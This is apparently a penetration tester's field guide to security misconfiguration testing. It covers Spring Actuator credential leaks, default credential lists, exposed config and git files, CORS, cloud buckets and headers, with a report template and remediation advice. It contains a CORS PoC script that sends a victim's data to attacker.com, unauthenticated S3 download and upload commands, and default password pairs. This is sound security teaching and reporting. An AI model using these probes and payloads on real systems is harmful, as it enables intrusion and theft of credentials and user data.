# Security Misconfiguration — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** Security Misconfiguration — OWASP A05:2021
>
> **Severity:** Low to Critical — depends entirely on what is exposed
>
> **Real-world impact:** Security misconfiguration is consistently the highest-volume finding class across every enterprise engagement I conduct. It does not require advanced exploitation techniques — it requires looking in places developers and operations teams forgot about. Debug endpoints left enabled in production, configuration files accessible from the web root, default credentials on admin panels, verbose error messages revealing the entire application stack — these are not sophisticated vulnerabilities. They are operational failures, and they open doors to every other vulnerability class.

---

## 🧠 Why This Write-Up Exists

Every enterprise application I have tested has had at least one security misconfiguration finding. Not always Critical — but always present. The reason is that security misconfiguration is a byproduct of how enterprise applications are built and deployed: development teams enable verbose errors and debug endpoints for convenience, deployment teams copy development configurations to production, and nobody runs a final hardening checklist before go-live.

The findings range from trivially low severity (a missing security header) to immediately Critical (a Spring Boot Actuator `/actuator/env` endpoint exposing every environment variable — database passwords, API keys, internal service credentials — with no authentication). I have found both in the same application in the same engagement, which is typical.

This document is my field checklist for finding misconfiguration efficiently across enterprise .NET, Java Spring, and PHP applications — the three stacks I encounter most frequently.

---

## 📖 What Is Security Misconfiguration?

Security misconfiguration occurs when security settings are incorrectly defined, implemented, or maintained — or are left at insecure defaults. It is the broadest vulnerability category in the OWASP Top 10 because it covers everything from wrong configuration values to entirely absent security controls.

```
Enterprise Security Misconfiguration Attack Surface:

  [Default Credentials]    → Admin panels, databases, network devices, CMSes
  [Debug & Admin Endpoints]→ Spring Actuator, Swagger UI, GraphQL introspection
  [Exposed Config Files]   → .env, web.config, appsettings.json, .git/
  [Verbose Error Messages] → Stack traces, DB schema, file paths, versions
  [Directory Listing]      → Browsable directories exposing backup and config files
  [Missing Security Headers] → No CSP, no HSTS, no X-Frame-Options
  [Cloud Misconfiguration] → Open S3 buckets, unauthenticated Azure Blob, GCS
  [TLS/SSL Issues]         → Weak ciphers, TLS 1.0/1.1 still enabled, no HSTS
  [Unnecessary Services]   → Management ports open, test endpoints in production
  [CORS Misconfiguration]  → Access-Control-Allow-Origin: * on sensitive APIs
```

---

## 🔍 Phase 1 — Reconnaissance: The First 15 Minutes

My standard misconfiguration recon sequence — the same one I run at the start of every web application engagement before testing any other vulnerability class.

```
1. robots.txt and sitemap — always first:
   /robots.txt     → Disallowed entries map the sensitive areas
   /sitemap.xml    → Full URL structure of the application

2. Common sensitive file check (quick manual probes):
   /.env
   /.env.production
   /.env.local
   /web.config
   /appsettings.json
   /appsettings.Production.json
   /.git/config
   /.git/HEAD

3. Debug and admin endpoint quick check:
   /actuator              → Spring Boot
   /actuator/env          → Spring Boot full env dump
   /swagger-ui.html       → API documentation (Java/Spring)
   /swagger-ui/index.html
   /api/swagger-ui.html
   /v2/api-docs           → Swagger JSON spec
   /graphql               → GraphQL endpoint
   /console               → H2 database console, Rails console
   /phpinfo.php           → PHP configuration page
   /server-status         → Apache status page

4. Error page check:
   /nonexistent-page-xyz  → What does the 404 look like?
   /api/users/abc         → Send wrong type to numeric ID
   GET /login with method: DELETE → Trigger 405 — does it leak info?

5. Response header check (one request):
   Examine any response for:
   Server: Apache/2.4.49          ← version disclosure
   X-Powered-By: ASP.NET          ← stack disclosure
   X-AspNet-Version: 4.0.30319    ← precise version
   Content-Security-Policy        ← present or missing?
   Strict-Transport-Security      ← present or missing?
```

---

## 💥 Phase 2 — Attack Vectors

### Vector 1 — Default Credentials

Every enterprise engagement starts with a default credential test on every admin, management, and login panel I find.

```
Panels to look for in enterprise environments:
  /admin          /wp-admin        /manager/html (Tomcat)
  /phpmyadmin     /adminer         /console
  /administrator  /cpanel          /webadmin
  /cms            /sitecore        /umbraco
  /_admin         /admin.php       /admin/login

Default credential pairs (try systematically):
  admin:admin          admin:password       admin:1234
  admin:admin123       root:root            root:toor
  administrator:administrator              test:test
  guest:guest          user:user            admin:(blank)

For specific platforms:
  Tomcat Manager:  tomcat:tomcat  |  admin:admin  |  tomcat:s3cret
  Jenkins:         admin:admin (first-run bypass: /j_security_check)
  JIRA:            admin:admin
  Confluence:      admin:admin
  phpMyAdmin:      root:(blank)
  Grafana:         admin:admin

In Burp Suite:
  Capture login POST → Send to Intruder → Pitchfork attack
  Payload 1: usernames list
  Payload 2: passwords list
  Look for: different response length, 302 redirect, "Welcome" in response
```

> **Enterprise context:** I found a Tomcat Manager instance at `/manager/html` on an enterprise Java application server with credentials `tomcat:tomcat`. This gave direct WAR file deployment capability — meaning I could deploy a web shell to the server and achieve full remote code execution. The Tomcat instance had been running since the initial application deployment five years earlier and nobody had changed the default credentials.

---

### Vector 2 — Spring Boot Actuator Endpoints

The highest-value misconfiguration I find in enterprise Java applications. Spring Boot Actuator is a monitoring and management framework that exposes application internals. When misconfigured, it leaks everything.

```
Step 1 — Find the Actuator base path:
  /actuator
  /manage
  /management
  /application    (older Spring Boot versions)
  /ops

Step 2 — If /actuator returns 200, enumerate all enabled endpoints:
  GET /actuator
  Response: {
    "_links": {
      "env": {"href": "/actuator/env"},
      "heapdump": {"href": "/actuator/heapdump"},
      "mappings": {"href": "/actuator/mappings"},
      "beans": {"href": "/actuator/beans"},
      "trace": {"href": "/actuator/trace"},
      "health": {"href": "/actuator/health"}
    }
  }

Step 3 — Priority endpoints to check:

/actuator/env
  → Returns ALL environment variables
  → Contains: database URLs + credentials, API keys, JWT secrets,
    cloud service credentials, internal service URLs
  Example leak:
  {"SPRING_DATASOURCE_PASSWORD": "Pr0d_DB_P@ss2024!",
   "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
   "JWT_SECRET": "myProductionJWTSecret"}

/actuator/heapdump
  → Downloads a full JVM heap dump (can be 500MB+)
  → Extract offline with Eclipse Memory Analyser (MAT)
  → Contains: all in-memory strings including decrypted secrets,
    active session tokens, database query results, user data

/actuator/mappings
  → Lists every URL route in the application
  → Reveals hidden admin endpoints, internal APIs, management paths
  → Accelerates the entire engagement significantly

/actuator/trace or /actuator/httptrace
  → Shows recent HTTP request/response history
  → May contain: session tokens, Authorization headers, request bodies
  → Live credential harvesting if application is in active use

/actuator/beans
  → All Spring beans = complete application architecture map
  → Identifies framework versions, third-party libraries, data sources

Step 4 — Extract credentials from env dump:
  Look for keys containing: PASSWORD, SECRET, KEY, TOKEN, CREDENTIAL
  These appear as: {"name":"SPRING_DATASOURCE_PASSWORD","value":"***"}
  Note: In newer Spring Boot, values may be masked with *** in env
  → But heapdump will contain the unmasked values in memory
```

> **Enterprise context:** I found `/actuator/env` accessible without authentication on a financial services internal application. The response contained the production database connection string (`jdbc:sqlserver://PROD-DB01:1433;password=Finance@2023!`), an AWS Access Key ID and Secret, a Stripe live API key, and the application's JWT signing secret. Separately, `/actuator/heapdump` allowed me to download the full heap and extract 200+ active user session tokens using Eclipse MAT. This single misconfiguration — Actuator endpoints exposed without authentication — was the highest-severity finding in a 15-day engagement.

---

### Vector 3 — Verbose Error Messages & Stack Traces

Enterprise .NET and Java applications in production frequently have debug mode enabled or exception handling misconfigured, leaking the full application internals on error.

```
How to trigger maximum information from error responses:

Method 1 — Type confusion:
  Numeric ID parameter → send string: /api/users/abc
  Boolean parameter → send object: ?active={"key":"val"}
  Date parameter → send invalid date: ?from=99-99-9999

Method 2 — Null and boundary values:
  /api/users/null
  /api/users/0
  /api/users/-1
  /api/users/99999999999

Method 3 — Malformed content type:
  Send POST with Content-Type: application/xml to JSON endpoint
  Send POST with truncated JSON body: {"user": }
  Send empty body to required-fields endpoint

Method 4 — SQL injection character (don't need to exploit — just trigger error):
  /api/users/1'
  ?search=test'
  → May trigger visible SQL error with query structure

What Enterprise .NET stack traces reveal:
  System.NullReferenceException: Object reference not set
    at CompanyApp.DataLayer.UserRepository.GetById(Int32 id)
      in C:\inetpub\wwwroot\CompanyApp\DataLayer\UserRepository.cs:line 47
    at CompanyApp.BusinessLayer.UserService.FetchProfile(Int32 userId)
    at CompanyApp.Controllers.UserController.GetProfile(Int32 id)

Disclosed:
  → Physical path:    C:\inetpub\wwwroot\CompanyApp\
  → Class names:      UserRepository, UserService, UserController
  → Line numbers:     Exact source code location
  → Namespace:        CompanyApp.DataLayer (architecture)
  → DB column hint:   "Column 'UserID' does not exist" reveals schema

Response headers version disclosure:
  Server: Microsoft-IIS/8.5            ← check NVD for CVEs
  X-Powered-By: ASP.NET
  X-AspNet-Version: 4.0.30319
  X-AspNetMvc-Version: 5.2
```

---

### Vector 4 — Exposed Configuration & Backup Files

A checklist of high-value file paths I probe in every enterprise engagement. The findings here are consistently the highest single-step CVSS scores.

```
.NET / IIS targets (highest priority):
  /web.config                  → SQL connection strings, API keys, auth config
  /appsettings.json            → .NET Core application configuration
  /appsettings.Production.json → Production-specific secrets
  /appsettings.Development.json → Sometimes deployed to production accidentally
  /App_Data/                   → ASP.NET data directory — databases, logs
  /App_Data/database.mdf       → SQL Server database file

PHP targets:
  /config.php
  /configuration.php           → Joomla configuration
  /wp-config.php               → WordPress database credentials
  /settings.php                → Drupal configuration
  /includes/config.php

Java / Spring targets:
  /WEB-INF/web.xml             → Servlet configuration
  /WEB-INF/applicationContext.xml → Spring bean configuration
  /META-INF/MANIFEST.MF        → Application version and classpath

Environment files:
  /.env
  /.env.production
  /.env.local
  /.env.backup
  /config/.env

Version control exposure:
  /.git/config                 → Remote URL (may contain credentials)
  /.git/HEAD                   → Current branch
  /.git/COMMIT_EDITMSG         → Last commit message
  /.gitignore                  → Reveals what files exist (even if excluded)
  /.svn/entries                → SVN metadata
  /.hg/                        → Mercurial repository

Backup files:
  /backup.zip       /backup.tar.gz    /backup.sql
  /db_backup.sql    /database.sql     /prod_backup.sql
  /site_backup.zip  /wwwroot.zip
  Try adding backup extensions to known files:
  /web.config.bak   /appsettings.json.old   /config.php.bak
```

---

### Vector 5 — CORS Misconfiguration

Cross-Origin Resource Sharing misconfigurations are consistently present in enterprise API applications and enable cross-site reading of sensitive API responses.

```
Test in Burp Repeater — add Origin header to any API request:

Test 1 — Wildcard:
GET /api/users/me HTTP/1.1
Origin: https://attacker.com

If response contains:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true   ← this combination is critical
→ Any website can make authenticated requests to this API and read responses

Test 2 — Origin reflection:
If response contains:
Access-Control-Allow-Origin: https://attacker.com   ← reflects your origin
Access-Control-Allow-Credentials: true
→ Reflected origin CORS = any attacker domain = critical

Test 3 — Null origin:
GET /api/users/me HTTP/1.1
Origin: null

If response reflects: Access-Control-Allow-Origin: null
→ Sandbox iframe attack possible (similar to CSRF + data theft)

Test 4 — Subdomain trust:
Origin: https://evil.company.com   → accepted?
Origin: https://attacker.company.com.evil.com  → accepted?
→ If yes = subdomain takeover + CORS chain possible

Exploitation PoC (if CORS misconfigured):
<script>
  fetch('https://api.company.com/api/users/me', {
    credentials: 'include'   // sends victim's cookies cross-origin
  })
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/steal?d=' + JSON.stringify(data));
  });
</script>
→ Delivers victim's full profile data to attacker cross-origin
```

---

### Vector 6 — Cloud Storage Misconfiguration

Publicly accessible cloud storage is consistently one of the most severe misconfiguration findings in enterprise engagements involving AWS, Azure, or GCP deployments.

```
AWS S3 Bucket Discovery:
  From JS source:  grep for: s3.amazonaws.com, s3://, bucket_name
  From API responses: {"profile_image": "https://company-assets.s3..."}
  From HTML source comments: <!-- stored at s3://company-backup -->
  Common naming patterns:
    company-backup     company-assets    company-logs
    company-prod       company-dev       company-staging
    company-uploads    company-exports   company-archive

Test unauthenticated access:
  https://BUCKETNAME.s3.amazonaws.com/
  https://s3.amazonaws.com/BUCKETNAME/
  → If directory listing returns XML = public read access

  Using AWS CLI (no credentials):
  aws s3 ls s3://company-backup --no-sign-request
  aws s3 cp s3://company-backup/database.sql . --no-sign-request

Test write access (be careful — do not modify production data):
  aws s3 cp test.txt s3://company-backup/ --no-sign-request
  → If succeeds = public write access = anyone can upload

Azure Blob Storage:
  https://ACCOUNT.blob.core.windows.net/CONTAINER/?restype=container&comp=list
  → 200 with XML listing = public container

GCP Cloud Storage:
  https://storage.googleapis.com/BUCKETNAME/
  → 200 with XML = public bucket

What to look for inside open buckets:
  database.sql, backup.zip, logs/       → credentials and PII
  .env, config.json                     → application secrets
  user_exports/, reports/               → user data (GDPR violation)
  api_keys.txt, credentials.json        → infrastructure access
```

---

### Vector 7 — Missing Security Response Headers

Lower severity individually but important to document and chain with other findings.

```
Check every response with Burp Suite — look for absence of:

Header                          Why It Matters
──────────────────────────────────────────────────────────
Content-Security-Policy         Missing = XSS easier to exploit, no mitigation
Strict-Transport-Security       Missing = HTTPS downgrade possible (HSTS)
X-Frame-Options                 Missing = Clickjacking attacks possible
X-Content-Type-Options: nosniff Missing = MIME type confusion attacks
Referrer-Policy                 Missing = Full URL in Referer leaks to third parties
Permissions-Policy              Missing = Camera, mic, geolocation access unrestricted

Verify quickly with curl:
curl -I https://target.company.com | grep -iE \
  "Content-Security|Strict-Transport|X-Frame|X-Content-Type|Referrer-Policy"

Report guidance:
  Missing headers alone = Low severity
  Missing CSP + XSS present = Medium (CSP would have mitigated XSS)
  Missing HSTS + HTTP accessible = Medium (downgrade attack vector)
  Always note which headers are missing and what attacks they enable
```

---

## 🗂️ Systematic Testing Checklist

```
FIRST 15 MINUTES (always)
☐ /robots.txt and /sitemap.xml — map hidden paths
☐ /.env, /web.config, /appsettings.json — config file exposure
☐ /.git/config — version control exposure
☐ /actuator or /actuator/env — Spring Boot actuator check
☐ /swagger-ui.html or /api-docs — API documentation exposure
☐ Error page: request /nonexistent-xyz — what does 404 reveal?
☐ Response headers: Server, X-Powered-By, X-AspNet-Version

DEFAULT CREDENTIALS
☐ Find all login panels: /admin, /manager, /console, /phpmyadmin
☐ Try admin:admin, admin:password, root:root, test:test on each
☐ Check platform-specific defaults (Tomcat, Jenkins, Grafana, JIRA)

DEBUG ENDPOINTS
☐ /actuator/env — environment variables
☐ /actuator/heapdump — memory dump
☐ /actuator/mappings — route map
☐ /phpinfo.php — PHP configuration
☐ /graphql with introspection query — schema disclosure
☐ /console — H2/Rails/Django debug console

ERROR MESSAGE TESTING
☐ Send strings to numeric parameters
☐ Send null/0/-1 to ID parameters
☐ Send malformed JSON to POST endpoints
☐ Check 404/500 pages for stack traces

CLOUD STORAGE
☐ Find S3/Azure/GCS bucket names in JS source, API responses
☐ Test unauthenticated read: aws s3 ls --no-sign-request
☐ Test unauthenticated write (document only, do not execute in prod)

CORS
☐ Add Origin: https://attacker.com to API requests
☐ Check for Access-Control-Allow-Origin: * with credentials
☐ Test reflected Origin — does server mirror your Origin header?

SECURITY HEADERS
☐ Content-Security-Policy present?
☐ Strict-Transport-Security present?
☐ X-Frame-Options present?
☐ X-Content-Type-Options: nosniff present?
```

---

## 📋 Enterprise Pentest Report Template

---

**Finding Title:** Spring Boot Actuator `/actuator/env` Exposed Without Authentication — Full Credentials Disclosure

**Severity:** Critical

**CVSS v3.1 Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Affected URL:** `https://internal-app.company.com/actuator/env`

**Authentication Required:** None

---

**Vulnerability Description:**

The Spring Boot Actuator management endpoint is exposed on the production application without authentication. The `/actuator/env` endpoint returns all environment variables configured in the application, including production database credentials, third-party API keys, JWT signing secrets, and cloud service access keys. No authentication or network restriction prevents access to this endpoint.

---

**Steps to Reproduce:**

1. Navigate to `https://internal-app.company.com/actuator`
   → Returns list of all available Actuator endpoints (no authentication required)
2. Navigate to `https://internal-app.company.com/actuator/env`
   → Returns full environment variable dump including sensitive credentials

---

**Proof of Concept:**

```
Request:
GET /actuator/env HTTP/1.1
Host: internal-app.company.com
(No authentication header)

Response (abbreviated):
HTTP/1.1 200 OK
{
  "propertySources": [{
    "name": "systemEnvironment",
    "properties": {
      "SPRING_DATASOURCE_URL": {
        "value": "jdbc:sqlserver://PROD-DB01.company.internal:1433;database=AppDB"
      },
      "SPRING_DATASOURCE_PASSWORD": {"value": "Pr0d_DB_P@ss2024!"},
      "AWS_ACCESS_KEY_ID":          {"value": "AKIAIOSFODNN7EXAMPLE"},
      "AWS_SECRET_ACCESS_KEY":      {"value": "wJalrXUtnFEMI/K7MDENG/..."},
      "JWT_SECRET":                 {"value": "my_production_jwt_secret_2024"},
      "STRIPE_SECRET_KEY":          {"value": "sk_live_abc123xyz..."}
    }
  }]
}
```

---

**Business Impact:**

- Direct access to production SQL Server database with disclosed credentials
- Full AWS account access via exposed Access Key — compute, storage, and all services
- JWT secret enables forging of authentication tokens for any user account
- Stripe live API key enables financial transaction access
- Credential rotation required across all disclosed secrets immediately

---

**Remediation:**

| Priority | Action |
|---|---|
| Immediate | Rotate ALL disclosed credentials — database, AWS, JWT secret, Stripe key |
| Immediate | Restrict Actuator endpoints behind authentication |
| Immediate | In `application.properties`: `management.endpoints.web.exposure.include=health` (expose health only) |
| Short-term | Restrict Actuator to management network only via firewall rule or Spring Security config |
| Short-term | Audit all Actuator endpoints across all environments |
| Long-term | Add Actuator endpoint exposure to security hardening checklist for all deployments |

```yaml
# application.properties — secure Actuator configuration
management.endpoints.web.exposure.include=health
management.endpoints.web.exposure.exclude=env,heapdump,trace,beans,mappings
management.endpoint.health.show-details=never
management.server.port=8081           # separate management port
# Then firewall port 8081 to internal network only
```

---

## 🧪 Practice Labs

| Platform | Resource | Focus Area |
|---|---|---|
| [PortSwigger Information Disclosure](https://portswigger.net/web-security/information-disclosure) | 5 free labs | Error messages, source disclosure |
| [TryHackMe OWASP Top 10](https://tryhackme.com) | Security misconfiguration room | Practical scenarios |
| [HackTheBox](https://hackthebox.com) | Web challenges | Real-world misconfiguration |
| [DVWA](https://github.com/digininja/DVWA) | Various modules | Local safe practice |

---

## 🧭 Key Takeaways From 5+ Years of Enterprise Testing

**1. The first 15 minutes of misconfiguration recon can hand you Critical findings.**
Before I test a single injection point or authentication bypass, I run my standard misconfiguration probe list. In multiple engagements, this 15-minute sequence has returned Critical findings — credentials in a `.env` file, an Actuator endpoint leaking database passwords, a `.git/config` file exposing the internal repository URL. The vulnerability is already there before I start; I just need to look.

**2. Spring Boot Actuator is the single highest-value misconfiguration target in enterprise Java.**
If the application is built on Spring Boot, always find and test the Actuator endpoint. `/actuator/env` exposing secrets is a Critical finding. `/actuator/heapdump` allowing full memory extraction is Critical. The `/actuator/mappings` endpoint that reveals every internal URL path is High. I find at least one Actuator misconfiguration in approximately 40% of Java enterprise engagements.

**3. Internal applications have dramatically worse misconfiguration posture than external ones.**
External applications get reviewed, WAF-protected, and hardened because they are public-facing. Internal tools — HR portals, finance dashboards, IT management panels — are deployed with the same configuration used in development. Debug mode on, default credentials unchanged, verbose errors enabled. Always prioritise internal application testing within your engagement scope.

**4. CORS misconfiguration is often rated too low in impact assessments.**
A wildcard CORS header (`Access-Control-Allow-Origin: *`) with `Access-Control-Allow-Credentials: true` allows any website to make authenticated API calls on behalf of a victim and read the response. This is equivalent to having no same-origin policy. Yet it is often filed as Medium because it requires an XSS somewhere to complete the chain. In enterprise environments with multiple applications sharing an SSO session, the chain is often trivially completable.

**5. Credential rotation is the most urgent remediation action.**
When a misconfiguration exposes credentials — a `.env` file, an Actuator env dump, a `web.config` with connection strings — the first recommendation in the report is always immediate credential rotation, before anything else. Even if the vulnerability is fixed, if the old credentials are still valid, the risk remains. State this explicitly in every credential exposure finding.

---

## 🔗 References

- [OWASP Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [Spring Boot Actuator Security Guide](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html)
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [AWS S3 Bucket Security](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- [SecurityHeaders.com](https://securityheaders.com)

---

<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
